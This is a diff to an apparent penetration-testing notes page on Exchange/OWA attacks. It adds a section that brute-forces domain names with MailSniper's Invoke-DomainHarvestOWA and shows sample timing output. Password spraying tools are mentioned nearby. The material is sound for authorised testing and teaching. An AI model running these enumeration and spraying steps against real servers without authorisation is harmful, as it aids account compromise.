@@ -10,6 +10,7 @@ When you install Exchange Server, Outlook on the web is automatically available 
 
 In this section some attacks and enumeration techniques are going to be detailed.
 
+
 # Password Spraying
 
 Two excellent tools for password spraying againts Office 365 and Exchange are `MailSniper` and `SprayingToolkit`.
@@ -29,9 +30,52 @@ Enumerate the NetBIOS name of the target domain.
 Invoke-DomainHarvestOWA -ExchHostname <IP>
 ```
 
+## Domain Hardvesting
+
+We can also bruteforce with a wordlist the OWA in order to find new domains.
+```
+Invoke-DomainHarvestOWA -ExchHostname 10.10.10.10 -DomainList .\domains.txt -Brute
+
+[*] Harvesting domain name from the server at 10.10.10.10
+Determining baseline response time...
+Response Time (MS)       Domain\Username
+35                       DcXGdH\RMiZSy
+37                       XmSgFT\CLJKpM
+56                       NxgOsI\zcYaPt
+28                       MgSBFo\YXEQcP
+40                       BAYNGp\xFqOer
+
+         Baseline Response: 39.2
+
+Threshold: 107.8
+
+Response Time (MS)       Domain\Username
+28                       www\LjldcpFEeQ
+28                       mail\LjldcpFEeQ
+36                       ftp\LjldcpFEeQ
+37                       localhost\LjldcpFEeQ
+49                       webmail\LjldcpFEeQ
+57                       smtp\LjldcpFEeQ
+60                       webdisk\LjldcpFEeQ
+40                       pop\LjldcpFEeQ
+30                       cpanel\LjldcpFEeQ
+32                       whm\LjldcpFEeQ
+36                       ns1\LjldcpFEeQ
+26                       ns2\LjldcpFEeQ
+27                       autodiscover\LjldcpFEeQ
+32                       autoconfig\LjldcpFEeQ
+27                       ns\LjldcpFEeQ
+26                       test\LjldcpFEeQ
+43                       m\LjldcpFEeQ
+26                       blog\LjldcpFEeQ
+739                      dev\LjldcpFEeQ
+[*] Potentialy Valid Domain! Domain:dev
+61                       www2\LjldcpFEeQ
+44                       ns3\LjldcpFEeQ
+```
 ## Finding Posible Usernames
 
-it is common to see in organizations that usernames follow a pattern. For example:, typicall patterns are:
+It is common to see in organizations that usernames follow a pattern. For example:, typicall patterns are:
 
 ```
 {first}.{last}
